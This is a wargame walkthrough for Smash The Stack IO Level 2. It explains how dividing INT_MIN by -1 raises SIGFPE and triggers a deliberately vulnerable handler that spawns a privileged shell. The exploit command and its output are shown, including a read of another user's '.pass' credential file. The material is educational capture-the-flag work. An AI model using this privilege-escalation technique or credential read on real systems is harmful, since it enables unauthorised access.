---
title: "Smash The Stack: IO Level 2 Walkthrough"
date: 2014-12-01T00:48:04+00:00
url: "/smash-the-stack-level2/"
draft: false
description: "A walkthrough of Level 2 on the Smash The Stack IO wargame, exploiting signed integer overflow with SIGFPE to spawn a privileged shell."
categories: ["Bash", "exploit-dev", "Linux", "Security"]
tags: ["smashthestack", "wargame", "integer-overflow", "sigfpe"]
---

In Level 2 of the Smash The Stack IO wargame, source code is provided directly in `level02.c`:

```bash
level2@io:/levels$ cat level02.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>

void catcher(int a)
{
    setresuid(geteuid(), geteuid(), geteuid());
    printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
    puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

### Analyzing the Code

1. **The Target (`catcher`)**: The `catcher` function sets the real, effective, and saved UID to the effective UID (`geteuid()`) and drops into `/bin/sh`. This triggers when the program receives a `SIGFPE` signal.
2. **Input Validation**: The check `if (argc != 3 || !atoi(argv[2]))` ensures two arguments are passed and `argv[2]` does not evaluate to `0`. This explicitly prevents standard division-by-zero errors.
3. **The Division**: The function returns `abs(atoi(argv[1])) / atoi(argv[2])`.

### Understanding `SIGFPE` and Two's Complement Overflow

In C on 32-bit x86 systems, a signed 32-bit integer ranges from `-2,147,483,648` (`INT_MIN` / `0x80000000`) to `+2,147,483,647` (`INT_MAX` / `0x7FFFFFFF`).

What happens if you divide `INT_MIN` by `-1`?

$$\frac{-2147483648}{-1} = +2147483648$$

Because `+2147483648` cannot be represented in a 32-bit signed integer (it exceeds `INT_MAX`), the CPU generates an arithmetic overflow exception (division error). In Linux, the kernel translates this hardware fault into a **`SIGFPE` (Floating-Point Exception)** signal.

Furthermore, `abs(INT_MIN)` cannot represent `+2147483648`, returning `INT_MIN` unchanged.

### Exploitation

We can pass `INT_MIN` (`-2147483648`) as `argv[1]` and `-1` as `argv[2]`:

```bash
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.2$ whoami
level3
sh-4.2$ cat /home/level3/.pass
```

The integer overflow raises `SIGFPE`, invoking `catcher()` and giving us a shell as `level3`.
